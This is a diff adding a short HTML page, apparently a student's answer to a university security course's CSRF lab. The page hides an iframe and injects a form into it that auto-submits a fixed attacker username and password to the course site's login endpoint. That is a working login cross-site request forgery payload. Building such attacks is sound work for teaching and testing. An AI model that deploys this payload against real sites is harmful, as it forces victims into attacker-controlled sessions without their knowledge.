@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+</head>
+<body>
+	<iframe srcdoc="" id="ifr" style="display:none"></iframe>
+	<script>
+	$(document).ready(function(){
+		var form_injection = "<form action='https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4' method='post' id='formid'><input type='text' name='username' value='attacker'><input type='text' name='password' value='l33th4x'></form><script>document.getElementById('formid').submit();</scr" + "ipt>";
+		$("#ifr").attr("srcdoc", form_injection);
+	});
+	</script>
+</body>
+</html>
